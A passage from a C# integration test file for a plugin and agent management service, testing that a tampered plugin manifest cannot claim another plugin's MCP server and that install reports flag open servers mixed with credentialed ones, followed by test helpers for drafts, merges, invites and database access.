            "https://third.example.org/mcp"));
        Assert.Equal(OutcomeStatus.Ok, direct.Status);
    }

    // sec3 R1: a manifest cannot make another plugin's server its own (a hand edit of main), so its agents get no way past the one-plugin rule.
    [Fact]
    public async Task APluginManifest_ListingAnotherPluginsServer_IsInvalid_AndItsAgentGetsNoneOfIt()
    {
        await MergedPluginAsync(Docs(kind: "zip"));
        await MergedPluginAsync(Docs("other", kind: "zip", agent: "other-helper", server: "other-search"));
        var running = _kagent.AgentObjects[$"{Ns}/doc-helper"].ToJsonString();
        var manifest = _git.Main()["plugins/docs/plugin.yaml"];
        var listed = Regex.Match(manifest, @"\n( *)- docs-search\n");
        Assert.True(listed.Success, manifest);
        _git.Main()["plugins/docs/plugin.yaml"] = manifest.Insert(listed.Index + listed.Length, $"{listed.Groups[1].Value}- other-search\n");
        foreach (var (path, text) in AgentFiles(new AgentDraft("doc-helper", "d", "default-model-config", "x", [],
                     [new McpToolChoice("docs-search", []), new McpToolChoice("other-search", [])], [], null)))
            _git.Main()[path] = text!;

        await ReconcileAsync();

        Assert.Contains("It lists the server 'other-search', whose file is in another plugin's folder.", _console.ToString());
        Assert.Equal(running, _kagent.AgentObjects[$"{Ns}/doc-helper"].ToJsonString());
        Assert.DoesNotContain("other-search", running);
        // Its own servers are held, never removed, while the manifest is invalid.
        Assert.True(_kagent.ToolServers.ContainsKey($"{Ns}/docs-search"));
    }

    // sec3 R5: one party shipping a server without headers beside a credentialed one is said in the install report.
    [Fact]
    public async Task AnInstall_ShippingOpenAndCredentialedServers_SaysItsAgentsUseThemTogether()
    {
        var mixed = Docs() with { Servers = [DocsServer(), new PluginServerDraft("docs-fetch", "Fetches pages", "STREAMABLE_HTTP", "https://fetch.example.com/mcp", [])] };

        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_builderUser, mixed)).Status);
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_builderUser, Docs("solo", agent: "solo-helper", server: "solo-search"))).Status);

        Assert.Contains("- docs: its agents may use the servers without headers (docs-fetch) together with the credentialed ones (docs-search)", _git.Pulls[0].Body);
        Assert.DoesNotContain("together with the credentialed ones", _git.Pulls[1].Body);
    }

    // --- helpers ---

    private PluginDraft TwoServers(bool withGhValue = false, string kind = "catalog") => Docs(kind: kind) with
    {
        Agents = [Agent("doc-helper", "docs-search"), Agent("gh-helper", "gh-tools")],
        Servers = [DocsServer(), new PluginServerDraft("gh-tools", "GitHub tools", "SSE", "https://gh.example.com/sse",
            [withGhValue ? new PluginHeader("Authorization", null, GitHubToken) : new PluginHeader("Authorization", "Bearer ${GITHUB_TOKEN}", null)])]
    };

    private static PluginDraft Docs(string name = "docs", string kind = "catalog", string agent = "doc-helper", string server = "docs-search",
        string url = "https://docs.example.com/mcp") => new(
        name, "1.0.0", "Documentation helpers",
        kind == "git" ? new PluginSource("git", "https://github.com/acme/plugins", new string('a', 40), $"plugins/{name}", Digest) : new PluginSource(kind, $"{name}.zip", null, "", Digest),
        [Agent(agent, server)],
        [DocsServer(url) with { Name = server }],
        [new PluginNote("agents/reviewer.md", "unsupported", "it runs a local stdio server")]);

    private static PluginServerDraft DocsServer(string url = "https://docs.example.com/mcp") =>
        new("docs-search", "Searches the docs", "STREAMABLE_HTTP", url, [new PluginHeader("X-Api-Key", null, Literal)]);

    private static AgentDraft Agent(string name, string server) =>
        new(name, $"{name} answers from the docs", "default-model-config", "Answer from the docs.\nCite the page.", [], [new McpToolChoice(server, [])], [], null);

    private static Dictionary<string, string?> AgentFiles(AgentDraft agent)
    {
        var (agentYaml, grantsYaml) = AgentManifest.Render(agent, Ns);
        return new() { [$"agents/{agent.Name}/agent.yaml"] = agentYaml, [$"agents/{agent.Name}/grants.yaml"] = grantsYaml };
    }

    private static object Form(string name, object[]? tools = null, object[]? grants = null) => new
    {
        name,
        description = "A builder's agent",
        modelConfig = "default-model-config",
        instructions = "Help.",
        skills = Array.Empty<string>(),
        mcpTools = tools ?? [],
        grants = grants ?? [],
        memoryTtlDays = (int?)null
    };

    private static Dictionary<string, string> Values(string header, string value) => new() { [header] = value };

    private static StudioUser User(string id, string role) => StudioUser.From(new ClaimsPrincipal(new ClaimsIdentity(
        [new Claim(ClaimTypes.NameIdentifier, id), new Claim(ClaimTypes.Email, $"{id}@skanyxx.example"), new Claim(ClaimTypes.Role, role)], "test")));

    private async Task<Outcome<T>> SendAsync<T>(IRequest<Outcome<T>> request)
    {
        using var scope = _host.Services.CreateScope();
        return await scope.ServiceProvider.GetRequiredService<IMediator>().Send(request, TestContext.Current.CancellationToken);
    }

    private Task<Outcome<StudioResult>> InstallAsync(StudioUser who, PluginDraft draft) => SendAsync(new InstallPluginCommand(who, draft));

    /// <summary>A git or zip plugin: the owner installs and merges it (D222).</summary>
    private async Task MergedPluginAsync(PluginDraft draft)
    {
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_ownerUser, draft)).Status);
        Assert.Equal(HttpStatusCode.OK, (await MergeAsync(_owner, _git.Pulls.Last().Number)).StatusCode);
    }

    private async Task<int> ProposeAsync(object form)
    {
        var response = await _builder.PostAsJsonAsync("/api/studio/proposals", form);
        Assert.Equal(HttpStatusCode.Created, response.StatusCode);
        return (await response.Content.ReadFromJsonAsync<JsonElement>()).GetProperty("number").GetInt32();
    }

    private async Task MergedAgentAsync(string name) => Assert.Equal(HttpStatusCode.OK, (await MergeAsync(_supervisor, await ProposeAsync(Form(name)))).StatusCode);

    private Task<HttpResponseMessage> MergeAsync(HttpClient who, int number) => who.PostAsync($"/api/studio/proposals/{number}/merge", null);

    private string SecretOf(string server) =>
        _kagent.ToolServers[$"{Ns}/{server}"]["spec"]!["headersFrom"]![0]!["valueFrom"]!["name"]!.GetValue<string>();

    /// <summary>The reconciler's kept-in-use lines of the JSON console log, in order.</summary>
    private List<string> KeptLines() =>
        [.. _console.ToString().Split('\n').Where(l => l.Contains("Studio keeps the plugin servers that left main while agents in main still use them"))];

    private List<string> StudioAgents() => [.. _kagent.AgentObjects.Keys.Where(k => k != $"{Ns}/skanyxx-factory")];

    private int WriteCount() =>
        _kagent.Calls.Count(c => c.Method is "POST" or "PUT" or "DELETE" && (c.Path.StartsWith("/api/agents") || c.Path.StartsWith("/api/toolservers")));

    private async Task ExecuteAsync(string sql)
    {
        await using var connection = new NpgsqlConnection(_database);
        await connection.OpenAsync(TestContext.Current.CancellationToken);
        await using var command = new NpgsqlCommand(sql, connection);
        await command.ExecuteNonQueryAsync(TestContext.Current.CancellationToken);
    }

    private async Task<string?> ScalarAsync(string sql)
    {
        await using var connection = new NpgsqlConnection(_database);
        await connection.OpenAsync(TestContext.Current.CancellationToken);
        await using var command = new NpgsqlCommand(sql, connection);
        return (string?)await command.ExecuteScalarAsync(TestContext.Current.CancellationToken);
    }

    private async Task<int> ReconcileAsync()
    {
        var loop = _host.Services.GetServices<IHostedService>().Single(h => h.GetType().Name == "StudioReconcileLoop");
        var type = loop.GetType().Assembly.GetType("Skanyxx.Module.Agents.Studio.Reconcile.StudioReconciler")!;
        var reconciler = _host.Services.GetRequiredService(type);
        return await (Task<int>)type.GetMethod("ReconcileAsync")!.Invoke(reconciler, [CancellationToken.None])!;
    }

    private static async Task WaitUntilAsync(Func<bool> done, string what, int seconds = 20)
    {
        var until = DateTime.UtcNow.AddSeconds(seconds);
        while (!done())
        {
            if (DateTime.UtcNow > until)
                throw new TimeoutException($"Waited {seconds} s for {what}.");
            await Task.Delay(50);
        }
    }

    private async Task<(HttpClient Client, string Id)> PersonAsync(string email, string role)
    {
        var invite = await _owner.PostAsJsonAsync("/api/identity/invites", new { email, roles = new[] { role } });
        invite.EnsureSuccessStatusCode();
        var link = (await invite.Content.ReadFromJsonAsync<JsonElement>()).GetProperty("link").GetString()!;
        var token = Uri.UnescapeDataString(new Uri(link).Query.Split("token=")[1]);
        var accepted = await _host.Client().PostAsJsonAsync("/api/identity/invites/accept", new { token, password = Password });
        Assert.Equal(HttpStatusCode.Created, accepted.StatusCode);
        var body = await accepted.Content.ReadFromJsonAsync<JsonElement>();
        return (_host.Client(body.GetProperty("tokens").GetProperty("accessToken").GetString()!), body.GetProperty("user").GetProperty("id").GetString()!);
    }
}
